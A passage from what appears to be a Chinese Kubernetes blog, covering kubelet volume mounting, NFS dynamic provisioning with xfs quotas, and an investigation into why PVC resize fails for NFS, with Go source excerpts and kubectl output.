verifyVolumesMountedFunc(podName types.UniquePodName, expectedVolumes []string) wait.ConditionFunc { return func() (done bool, err error) { if errs := vm.desiredStateOfWorld.PopPodErrors(podName); len(errs) \u0026gt; 0 { return true, errors.New(strings.Join(errs, \u0026#34;; \u0026#34;)) } return len(vm.getUnmountedVolumes(podName, expectedVolumes)) == 0, nil } } // getUnmountedVolumes fetches the current list of mounted volumes from // the actual state of the world, and uses it to process the list of // expectedVolumes. It returns a list of unmounted volumes. // The list also includes volume that may be mounted in uncertain state. func (vm *volumeManager) getUnmountedVolumes(podName types.UniquePodName, expectedVolumes []string) []string { mountedVolumes := sets.NewString() for _, mountedVolume := range vm.actualStateOfWorld.GetMountedVolumesForPod(podName) { // 实际的挂载卷  mountedVolumes.Insert(mountedVolume.OuterVolumeSpecName) } // expectedVolumes为pod的全部挂载卷  // UnmountedVolumes = expectedVolumes - mountedVolumes  return filterUnmountedVolumes(mountedVolumes, expectedVolumes) }   参考资料  kubelet源码分析之volume manager源码分析 kubelet 创建 pod 的流程 ","permalink":"http://bingerambo.com/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"kubelet volume manager源码分析"},{"categories":["K8S"],"contents":"动态pv存储供应（k8s dynamic provisioning and storage） 和 nfs-server-provisioner 原理介绍和功能验证\n设计说明  Storage is a critical part of running containers, and Kubernetes offers some powerful primitives for managing it. Dynamic volume provisioning, a feature unique to Kubernetes, allows storage volumes to be created on-demand. Without dynamic provisioning, cluster administrators have to manually make calls to their cloud or storage provider to create new storage volumes, and then create PersistentVolume objects to represent them in Kubernetes. The dynamic provisioning feature eliminates the need for cluster administrators to pre-provision storage. Instead, it automatically provisions storage when it is requested by users. This feature was introduced as alpha in Kubernetes 1.2, and has been improved and promoted to beta in the latest release, 1.4. This release makes dynamic provisioning far more flexible and useful.\n What’s New? The alpha version of dynamic provisioning only allowed a single, hard-coded provisioner to be used in a cluster at once. This meant that when Kubernetes determined storage needed to be dynamically provisioned, it always used the same volume plugin to do provisioning, even if multiple storage systems were available on the cluster. The provisioner to use was inferred based on the cloud environment - EBS for AWS, Persistent Disk for Google Cloud, Cinder for OpenStack, and vSphere Volumes on vSphere. Furthermore, the parameters used to provision new storage volumes were fixed: only the storage size was configurable. This meant that all dynamically provisioned volumes would be identical, except for their storage size, even if the storage system exposed other parameters (such as disk type) for configuration during provisioning.\nAlthough the alpha version of the feature was limited in utility, it allowed us to “get some miles” on the idea, and helped determine the direction we wanted to take.\nThe beta version of dynamic provisioning, new in Kubernetes 1.4, introduces a new API object, StorageClass. Multiple StorageClass objects can be defined each specifying a volume plugin (aka provisioner) to use to provision a volume and the set of parameters to pass to that provisioner when provisioning. This design allows cluster administrators to define and expose multiple flavors of storage (from the same or different storage systems) within a cluster, each with a custom set of parameters. This design also ensures that end users don’t have to worry about the complexity and nuances of how storage is provisioned, but still have the ability to select from multiple storage options.\nDynamic Provisioning and Storage Classes in Kubernetes\n说明：\n 管理员只需要按存储类型，预置一些strorage class资源配置（可以理解为创建pv的模板），不需要为每个pvc声明手动创建pv 用户按所需strorage class，创建pvc，则系统（这里指的是nfs provisoner）会根据pvc信息，自动创建pv并进行绑定 当用户pod删除时，根据需要删除pvc，则绑定的pv会自动关联删除  provisioner、pv、pvc 图 资源视图 交互视图 搭建StorageClass+NFS,大致有以下几个步骤:\n 创建一个可用的NFS Serve 创建Service Account.这是用来管控NFS provisioner在k8s集群中运行的权限 创建StorageClass.负责建立PVC并调用NFS provisioner进行预定的工作,并让PV与PVC建立管理 创建NFS provisioner.有两个功能,一个是在NFS共享目录下创建挂载点(volume),另一个则是建了PV并将PV与NFS的挂载点建立关联  nfs-provisioner项目 新代码项目地址：https://github.com/kubernetes-sigs/nfs-ganesha-server-and-external-provisioner\n老项目地址（不再使用）https://github.com/kubernetes-retired/external-storage/tree/master/nfs\n可使用quay.io/kubernetes_incubator/nfs-provisioner镜像\nnfs-provisioner镜像 1 2  docker pull quay.io/kubernetes_incubator/nfs-provisioner docker save quay.io/kubernetes_incubator/nfs-provisioner:latest -o nfs-provisioner.img.tar   Arguments  provisioner - Name of the provisioner. The provisioner will only provision volumes for claims that request a StorageClass with a provisioner field set equal to this name. master - Master URL to build a client config from. Either this or kubeconfig needs to be set if the provisioner is being run out of cluster. kubeconfig - Absolute path to the kubeconfig file. Either this or master needs to be set if the provisioner is being run out of cluster. run-server - If the provisioner is responsible for running the NFS server, i.e. starting and stopping NFS Ganesha. Default true. use-ganesha - If the provisioner will create volumes using NFS Ganesha (D-Bus method calls) as opposed to using the kernel NFS server (\u0026lsquo;exportfs\u0026rsquo;). If run-server is true, this must be true. Default true. grace-period - NFS Ganesha grace period to use in seconds, from 0-180. If the server is not expected to survive restarts, i.e. it is running as a pod \u0026amp; its export directory is not persisted, this can be set to 0. Can only be set if both run-server and use-ganesha are true. Default 90. enable-xfs-quota - If the provisioner will set xfs quotas for each volume it provisions. Requires that the directory it creates volumes in ('/export') is xfs mounted with option prjquota/pquota, and that it has the privilege to run xfs_quota. Default false. failed-retry-threshold - If the number of retries on provisioning failure need to be limited to a set number of attempts. Default 10 server-hostname - The hostname for the NFS server to export from. Only applicable when running out-of-cluster i.e. it can only be set if either master or kubeconfig are set. If unset, the first IP output by hostname -i is used. device-based-fsids - If file system handles created by NFS Ganesha should be based on major/minor device IDs of the backing storage volume ('/export'). When running a cloud based kubernetes service (like Googles GKE service) set this to false as it might affect client connections on restarts of the nfs provisioner pod. Default true.  存储配额 nfs provisioner xfsQuotaer 通过添加project到目标目录的方式来设置配额大小\n实际上还是通过xfsQuotaer 实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // createQuota creates a quota for the directory by adding a project to // represent the directory and setting a quota on it func (p *nfsProvisioner) createQuota(directory string, capacity resource.Quantity) (string, uint16, error) { path := path.Join(p.exportDir, directory) limit := strconv.FormatInt(capacity.Value(), 10) block, projectID, err := p.quotaer.AddProject(path, limit) if err != nil { return \u0026#34;\u0026#34;, 0, fmt.Errorf(\u0026#34;error adding project for path %s: %v\u0026#34;, path, err) } err = p.quotaer.SetQuota(projectID, path, limit) if err != nil { p.quotaer.RemoveProject(block, projectID) return \u0026#34;\u0026#34;, 0, fmt.Errorf(\u0026#34;error setting quota for path %s: %v\u0026#34;, path, err) } return block, projectID, nil }   XfsQuotaer 需要系统配置 xfs文件系统挂载参数 prjquota 或则 pquota 参数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93  type xfsQuotaer struct { xfsPath string // The file where we store mappings between project ids and directories, and  // each project\u0026#39;s quota limit information, for backup.  // Similar to http://man7.org/linux/man-pages/man5/projects.5.html  projectsFile string projectIDs map[uint16]bool mapMutex *sync.Mutex fileMutex *sync.Mutex } // NewNFSProvisioner creates a Provisioner that provisions NFS PVs backed by // the given directory. func NewNFSProvisioner(exportDir string, client kubernetes.Interface, outOfCluster bool, useGanesha bool, ganeshaConfig string, enableXfsQuota bool, serverHostname string, maxExports int, exportSubnet string) controller.Provisioner { var quotaer quotaer var err error // 当XfsQuota功能开启时，才能进行配额  if enableXfsQuota { quotaer, err = newXfsQuotaer(exportDir) if err != nil { glog.Fatalf(\u0026#34;Error creating xfs quotaer! %v\u0026#34;, err) } } else { quotaer = newDummyQuotaer() } } // 构造XfsQuotaer unc newXfsQuotaer(xfsPath string) (*xfsQuotaer, error) { if _, err := os.Stat(xfsPath); os.IsNotExist(err) { return nil, fmt.Errorf(\u0026#34;xfs path %s does not exist\u0026#34;, xfsPath) } isXfs, err := isXfs(xfsPath) if err != nil { return nil, fmt.Errorf(\u0026#34;error checking if xfs path %s is an XFS filesystem: %v\u0026#34;, xfsPath, err) } if !isXfs { return nil, fmt.Errorf(\u0026#34;xfs path %s is not an XFS filesystem\u0026#34;, xfsPath) } entry, err := getMountEntry(path.Clean(xfsPath), \u0026#34;xfs\u0026#34;) if err != nil { return nil, err } // XfsQuotaer 需要系统配置 xfs文件系统挂载参数 prjquota 或则 pquota 参数  if !strings.Contains(entry.VfsOpts, \u0026#34;pquota\u0026#34;) \u0026amp;\u0026amp; !strings.Contains(entry.VfsOpts, \u0026#34;prjquota\u0026#34;) { return nil, fmt.Errorf(\u0026#34;xfs path %s was not mounted with pquota nor prjquota\u0026#34;, xfsPath) } _, err = exec.LookPath(\u0026#34;xfs_quota\u0026#34;) if err != nil { return nil, err } projectsFile := path.Join(xfsPath, \u0026#34;projects\u0026#34;) projectIDs := map[uint16]bool{} _, err = os.Stat(projectsFile) if os.IsNotExist(err) { file, cerr := os.Create(projectsFile) if cerr != nil { return nil, fmt.Errorf(\u0026#34;error creating xfs projects file %s: %v\u0026#34;, projectsFile, cerr) } file.Close() } else { re := regexp.MustCompile(\u0026#34;(?m:^([0-9]+):/.+$)\u0026#34;) projectIDs, err = getExistingIDs(projectsFile, re) if err != nil { glog.Errorf(\u0026#34;error while populating projectIDs map, there may be errors setting quotas later if projectIDs are reused: %v\u0026#34;, err) } } xfsQuotaer := \u0026amp;xfsQuotaer{ xfsPath: xfsPath, projectsFile: projectsFile, projectIDs: projectIDs, mapMutex: \u0026amp;sync.Mutex{}, fileMutex: \u0026amp;sync.Mutex{}, } return xfsQuotaer, nil }   配额扩容 在storageclass和k8s的默认配置下，通过修改pvc配置文件claim.yaml的配额大小，会报错，报错信息如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13  [root@node131 nfs]# vi deploy/kubernetes_incubator_nfs_provisioner/claim.yaml [root@node131 nfs]# 编辑size大小 [root@node131 nfs]# [root@node131 nfs]# kubectl apply -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml Warning: resource persistentvolumeclaims/nfs is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply. The missing annotation will be patched automatically. Error from server (Forbidden): error when applying patch: {\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{\u0026#34;kubectl.kubernetes.io/last-applied-configuration\u0026#34;:\u0026#34;{\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34;v1\\\u0026#34;,\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;PersistentVolumeClaim\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{\\\u0026#34;annotations\\\u0026#34;:{},\\\u0026#34;name\\\u0026#34;:\\\u0026#34;nfs\\\u0026#34;,\\\u0026#34;namespace\\\u0026#34;:\\\u0026#34;default\\\u0026#34;},\\\u0026#34;spec\\\u0026#34;:{\\\u0026#34;accessModes\\\u0026#34;:[\\\u0026#34;ReadWriteMany\\\u0026#34;],\\\u0026#34;resources\\\u0026#34;:{\\\u0026#34;requests\\\u0026#34;:{\\\u0026#34;storage\\\u0026#34;:\\\u0026#34;5Mi\\\u0026#34;}},\\\u0026#34;storageClassName\\\u0026#34;:\\\u0026#34;example-nfs\\\u0026#34;}}\\n\u0026#34;}},\u0026#34;spec\u0026#34;:{\u0026#34;resources\u0026#34;:{\u0026#34;requests\u0026#34;:{\u0026#34;storage\u0026#34;:\u0026#34;5Mi\u0026#34;}}}} to: Resource: \u0026#34;/v1, Resource=persistentvolumeclaims\u0026#34;, GroupVersionKind: \u0026#34;/v1, Kind=PersistentVolumeClaim\u0026#34; Name: \u0026#34;nfs\u0026#34;, Namespace: \u0026#34;default\u0026#34; for: \u0026#34;deploy/kubernetes_incubator_nfs_provisioner/claim.yaml\u0026#34;: persistentvolumeclaims \u0026#34;nfs\u0026#34; is forbidden: only dynamically provisioned pvc can be resized and the storageclass that provisions the pvc must support resize [root@node131 nfs]#   参考文档说明内容如下：\nStorageClass允许卷扩容 FEATURE STATE: Kubernetes v1.11 [beta] PersistentVolume 可以配置为可扩容。将此功能设置为 true 时，允许用户通过编辑相应的 PVC 对象来调整卷大小。\n当下层 StorageClass 的 allowVolumeExpansion 字段设置为 true 时，以下类型的卷支持卷扩展。\n此功能仅可用于扩容卷，不能用于缩小卷。\n注意，文档中没有说明nfs卷可以扩容，需要测试验证，测试验证如下 编辑 StorageClass ，添加 allowVolumeExpansion\n1 2 3 4 5 6 7 8 9 10 11  kind:StorageClassapiVersion:storage.k8s.io/v1metadata:name:example-nfsprovisioner:example.com/nfs# 允许卷扩容allowVolumeExpansion:truemountOptions:- vers=4.1  执行更新扩容为5M操作，发现pvc仍未更新 查看pvc的打印，如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  [root@node131 nfs]# kubectl apply -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim/nfs unchanged [root@node131 nfs]# kubectl describe pvc Name: nfs Namespace: default StorageClass: example-nfs Status: Bound Volume: pvc-1f9f7ceb-6ca8-453e-87a0-013e53841fad Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes volume.beta.kubernetes.io/storage-provisioner: example.com/nfs Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: \u0026lt;none\u0026gt; Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning ExternalExpanding 40m volume_expand Ignoring the PVC: didn\u0026#39;t find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. Warning ExternalExpanding 2m52s volume_expand Ignoring the PVC: didn\u0026#39;t find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. [root@node131 nfs]#   根据上面 提示，查看controller是否处理了pvc resize操作。\n查看kube-controller的打印，如下\n1 2 3  I0223 07:31:30.381326 1 expand_controller.go:277] Ignoring the PVC \u0026#34;default/nfs\u0026#34; (uid: \u0026#34;1f9f7ceb-6ca8-453e-87a0-013e53841fad\u0026#34;) : didn\u0026#39;t find a plugin capable of expanding the volume; waiting for an external controller to process this PVC. I0223 07:31:30.381389 1 event.go:291] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nfs\u0026#34; kind=\u0026#34;PersistentVolumeClaim\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Warning\u0026#34; reason=\u0026#34;ExternalExpanding\u0026#34; message=\u0026#34;Ignoring the PVC: didn\u0026#39;t find a plugin capable of expanding the volume; waiting for an external controller to process this PVC.\u0026#34;   原因 nfs并不支持在线动态扩容操作，即在storageclass条件下，通过修改pvc，同步联动修改pv\n说明：\nk8s从1.8版本开始支持PV扩容操作。目前glusterfs、rbd等几种存储类型已经支持扩容操作，按官方文档并未包含nfs存储。\nPV支持扩容需要满足两个条件：\n PersistentVolumeClaimResize插件使能，apiserver启动参数 \u0026ndash;enable-admission-plugins中添加 PersistentVolumeClaimResize StorageClass allowVolumeExpansion设置为true 当这两个条件达到之后，用户可以修改PVC的大小从而驱动底层PV的扩容操作。对于包含文件系统的PV，只有当新Pod启动并且以读写模式挂载该PV时才完成文件系统扩容。也就是说，当PV已经挂载在某个Pod时，需要重启该Pod才能完成文件系统扩容。目前支持支持扩容的文件系统包括Ext3/Ext4、XFS。  以上内容总结了k8s官方文档对PV扩容的描述。接下来我们研究PersistentVolumeClaimResize admission plugin。\n从代码中分析PersistentVolumeClaimResize Plugin的Validate操作比较简单，分为以下几个步骤：\n 验证PVC对象是否有效； 对比期望size和之前size，确认是否需要扩容； 确认当前PVC状态是否是bound状态； 检查PVC是否来自于StorageClass且StorageClass的AllowVolumeExpansion是否为true； 检查Volume后端是否支持Resize：判断pv的类型，目前包括Glusterfs、Cinder、RBD、GCEPersistentDisk、AWSElasticBlockStore、AzureFile。  PersistentVolumeClaimResize只是验证了PVC Resize的有效性，如果K8S集群没有使用PersistentVolumeClaimResize认证，PVC的resize是否会直接造成底层的Resize？ 分析了ExpandController的代码，发现它只是监听PVC Update事件，并且判断了PVC size以及当前状态等，并没有判断是否通过了PersistentVolumeClaimResize Plugin。这可能造成直接Resize操作。\napiserver 参数样例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  [root@node131 manifests]# cat kube-apiserver.yamlapiVersion:v1kind:Podmetadata:annotations:kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint:192.168.182.131:6443creationTimestamp:nulllabels:component:kube-apiservertier:control-planename:kube-apiservernamespace:kube-systemspec:containers:- command:- kube-apiserver- --advertise-address=192.168.182.131- --allow-privileged=true- --anonymous-auth=True- --apiserver-count=1- --authorization-mode=Node,RBAC- --bind-address=0.0.0.0- --client-ca-file=/etc/kubernetes/ssl/ca.crt#- --enable-admission-plugins=NodeRestriction- --enable-admission-plugins=\u0026#34;NodeRestriction,PersistentVolumeClaimResize\u0026#34;...  参考代码 kube apiserver 需要开启volume扩容插件 resize.PluginName, // PersistentVolumeClaimResize\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  // AllOrderedPlugins is the list of all the plugins in order. var AllOrderedPlugins = []string{ admit.PluginName, // AlwaysAdmit  autoprovision.PluginName, // NamespaceAutoProvision  lifecycle.PluginName, // NamespaceLifecycle  exists.PluginName, // NamespaceExists  scdeny.PluginName, // SecurityContextDeny  antiaffinity.PluginName, // LimitPodHardAntiAffinityTopology  limitranger.PluginName, // LimitRanger  serviceaccount.PluginName, // ServiceAccount  noderestriction.PluginName, // NodeRestriction  nodetaint.PluginName, // TaintNodesByCondition  alwayspullimages.PluginName, // AlwaysPullImages  imagepolicy.PluginName, // ImagePolicyWebhook  podsecuritypolicy.PluginName, // PodSecurityPolicy  podnodeselector.PluginName, // PodNodeSelector  podpriority.PluginName, // Priority  defaulttolerationseconds.PluginName, // DefaultTolerationSeconds  podtolerationrestriction.PluginName, // PodTolerationRestriction  exec.DenyEscalatingExec, // DenyEscalatingExec  exec.DenyExecOnPrivileged, // DenyExecOnPrivileged  eventratelimit.PluginName, // EventRateLimit  extendedresourcetoleration.PluginName, // ExtendedResourceToleration  label.PluginName, // PersistentVolumeLabel  setdefault.PluginName, // DefaultStorageClass  storageobjectinuseprotection.PluginName, // StorageObjectInUseProtection  gc.PluginName, // OwnerReferencesPermissionEnforcement  resize.PluginName, // PersistentVolumeClaimResize  runtimeclass.PluginName, // RuntimeClass  certapproval.PluginName, // CertificateApproval  certsigning.PluginName, // CertificateSigning  certsubjectrestriction.PluginName, // CertificateSubjectRestriction  defaultingressclass.PluginName, // DefaultIngressClass  // new admission plugins should generally be inserted above here  // webhook, resourcequota, and deny plugins must go at the end  mutatingwebhook.PluginName, // MutatingAdmissionWebhook  validatingwebhook.PluginName, // ValidatingAdmissionWebhook  resourcequota.PluginName, // ResourceQuota  deny.PluginName, // AlwaysDeny }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  const ( // PluginName is the name of pvc resize admission plugin  PluginName = \u0026#34;PersistentVolumeClaimResize\u0026#34; ) func (pvcr *persistentVolumeClaimResize) Validate(ctx context.Context, a admission.Attributes, o admission.ObjectInterfaces) error { if a.GetResource().GroupResource() != api.Resource(\u0026#34;persistentvolumeclaims\u0026#34;) { return nil } if len(a.GetSubresource()) != 0 { return nil } pvc, ok := a.GetObject().(*api.PersistentVolumeClaim) // if we can\u0026#39;t convert then we don\u0026#39;t handle this object so just return  if !ok { return nil } oldPvc, ok := a.GetOldObject().(*api.PersistentVolumeClaim) if !ok { return nil } oldSize := oldPvc.Spec.Resources.Requests[api.ResourceStorage] newSize := pvc.Spec.Resources.Requests[api.ResourceStorage] if newSize.Cmp(oldSize) \u0026lt;= 0 { return nil } if oldPvc.Status.Phase != api.ClaimBound { return admission.NewForbidden(a, fmt.Errorf(\u0026#34;Only bound persistent volume claims can be expanded\u0026#34;)) } // Growing Persistent volumes is only allowed for PVCs for which their StorageClass  // explicitly allows it  if !pvcr.allowResize(pvc, oldPvc) { return admission.NewForbidden(a, fmt.Errorf(\u0026#34;only dynamically provisioned pvc can be resized and \u0026#34;+ \u0026#34;the storageclass that provisions the pvc must support resize\u0026#34;)) } return nil } // Growing Persistent volumes is only allowed for PVCs for which their StorageClass // explicitly allows it. func (pvcr *persistentVolumeClaimResize) allowResize(pvc, oldPvc *api.PersistentVolumeClaim) bool { pvcStorageClass := apihelper.GetPersistentVolumeClaimClass(pvc) oldPvcStorageClass := apihelper.GetPersistentVolumeClaimClass(oldPvc) if pvcStorageClass == \u0026#34;\u0026#34; || oldPvcStorageClass == \u0026#34;\u0026#34; || pvcStorageClass != oldPvcStorageClass { return false } sc, err := pvcr.scLister.Get(pvcStorageClass) if err != nil { return false } if sc.AllowVolumeExpansion != nil { return *sc.AllowVolumeExpansion } return false }   controller相关代码 didn\u0026rsquo;t find a plugin capable of expanding the volume\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  volumePlugin, err := expc.volumePluginMgr.FindExpandablePluginBySpec(volumeSpec) if err != nil || volumePlugin == nil { msg := fmt.Errorf(\u0026#34;didn\u0026#39;t find a plugin capable of expanding the volume; \u0026#34; + \u0026#34;waiting for an external controller to process this PVC\u0026#34;) eventType := v1.EventTypeNormal if err != nil { eventType = v1.EventTypeWarning } expc.recorder.Event(pvc, eventType, events.ExternalExpanding, fmt.Sprintf(\u0026#34;Ignoring the PVC: %v.\u0026#34;, msg)) klog.Infof(\u0026#34;Ignoring the PVC %q (uid: %q) : %v.\u0026#34;, util.GetPersistentVolumeClaimQualifiedName(pvc), pvc.UID, msg) // If we are expecting that an external plugin will handle resizing this volume then  // is no point in requeuing this PVC.  return nil }   nfs-provisioner deploy说明 deployment说明\n部署 1 2 3 4 5 6 7 8 9 10  kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml kubectl get pv kubectl get pvc   部署信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135  [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml serviceaccount/nfs-provisioner created service/nfs-provisioner created deployment.apps/nfs-provisioner created [root@node131 nfs]# ls custom-nfs-busybox-rc.yaml custom-nfs-pv.yaml nfs-busybox-rc.yaml nfs-pvc.yaml nfs-server-rc.yaml nfs-web-service.yaml test custom-nfs-centos-rc.yaml custom-nfs-server-rc.yaml nfs-data nfs-pv.png nfs-server-service.yaml provisioner custom-nfs-pvc.yaml deploy nfsmount.conf nfs-pv.yaml nfs-web-rc.yaml README.md [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml storageclass.storage.k8s.io/example-nfs created [root@node131 nfs]# kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE example-nfs example.com/nfs Delete Immediate false 43s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl describe sc Name: example-nfs IsDefaultClass: No Annotations: \u0026lt;none\u0026gt; Provisioner: example.com/nfs Parameters: \u0026lt;none\u0026gt; AllowVolumeExpansion: \u0026lt;unset\u0026gt; MountOptions: vers=4.1 ReclaimPolicy: Delete VolumeBindingMode: Immediate Events: \u0026lt;none\u0026gt; [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv No resources found [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim/nfs created [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 3s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX Delete Bound default/nfs example-nfs 5s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 20s [root@node131 nfs]# kubectl describe pvc Name: nfs Namespace: default StorageClass: example-nfs Status: Bound Volume: pvc-26703096-84df-4c18-88f5-16d0b09be156 Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes volume.beta.kubernetes.io/storage-provisioner: example.com/nfs Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: \u0026lt;none\u0026gt; Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal ExternalProvisioning 27s (x2 over 27s) persistentvolume-controller waiting for a volume to be created, either by external provisioner \u0026#34;example.com/nfs\u0026#34; or manually created by system administrator Normal Provisioning 27s example.com/nfs_nfs-provisioner-66ccf9bc7b-jpm2w_9633218c-812f-4e94-b77e-9f922ec2edb6 External provisioner is provisioning volume for claim \u0026#34;default/nfs\u0026#34; Normal ProvisioningSucceeded 27s example.com/nfs_nfs-provisioner-66ccf9bc7b-jpm2w_9633218c-812f-4e94-b77e-9f922ec2edb6 Successfully provisioned volume pvc-26703096-84df-4c18-88f5-16d0b09be156 [root@node131 nfs]# [root@node131 nfs]# kubectl describe pv Name: pvc-26703096-84df-4c18-88f5-16d0b09be156 Labels: \u0026lt;none\u0026gt; Annotations: EXPORT_block: EXPORT { Export_Id = 1; Path = /export/pvc-26703096-84df-4c18-88f5-16d0b09be156; Pseudo = /export/pvc-26703096-84df-4c18-88f5-16d0b09be156; Access_Type = RW; Squash = no_root_squash; SecType = sys; Filesystem_id = 1.1; FSAL { Name = VFS; } } Export_Id: 1 Project_Id: 0 Project_block: Provisioner_Id: 1dbb40c3-3fd8-412d-94d8-a7b832bd98d3 kubernetes.io/createdby: nfs-dynamic-provisioner pv.kubernetes.io/provisioned-by: example.com/nfs Finalizers: [kubernetes.io/pv-protection] StorageClass: example-nfs Status: Bound Claim: default/nfs Reclaim Policy: Delete Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u0026lt;none\u0026gt; Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: 10.233.14.76 Path: /export/pvc-26703096-84df-4c18-88f5-16d0b09be156 ReadOnly: false Events: \u0026lt;none\u0026gt; [root@node131 nfs]# [root@node131 ~]# kubectl get po -A NAMESPACE NAME READY STATUS RESTARTS AGE default nfs-provisioner-66ccf9bc7b-jpm2w 1/1 Running 0 2m49s kube-system calico-kube-controllers-65b86747bd-c4qsp 1/1 Running 16 47d kube-system calico-node-lglh4 1/1 Running 18 47d kube-system coredns-8677555d68-jwggm 1/1 Running 4 6d kube-system kube-apiserver-node131 1/1 Running 16 47d kube-system kube-controller-manager-node131 1/1 Running 17 47d kube-system kube-proxy-mktp9 1/1 Running 16 47d kube-system kube-scheduler-node131 1/1 Running 17 47d kube-system nodelocaldns-lfjzs 1/1 Running 16 47d [root@node131 ~]#   查看下nfs挂载目录信息\n1 2 3 4 5 6 7 8 9 10 11  [root@node131 k8s_pv_pvc]# ll /srv/ 总用量 16 -rw-r--r--. 1 root root 4960 2月 8 10:48 ganesha.log -rw-------. 1 root root 36 2月 8 10:46 nfs-provisioner.identity drwxrwsrwx. 2 root root 6 2月 8 10:51 pvc-26703096-84df-4c18-88f5-16d0b09be156 drwxr-xr-x. 3 root root 19 2月 8 10:46 v4old drwxr-xr-x. 3 root root 19 2月 8 10:46 v4recov -rw-------. 1 root root 921 2月 8 10:51 vfs.conf   卸载删除 1 2 3 4 5 6 7 8 9 10  kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml   测试验证 存储写操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  kind:PodapiVersion:v1metadata:name:write-podspec:containers:- name:write-podimage:busyboximagePullPolicy:IfNotPresentcommand:- \u0026#34;/bin/sh\u0026#34;args:- \u0026#34;-c\u0026#34;- \u0026#34;touch /mnt/SUCCESS \u0026amp;\u0026amp; exit 0 || exit 1\u0026#34;volumeMounts:- 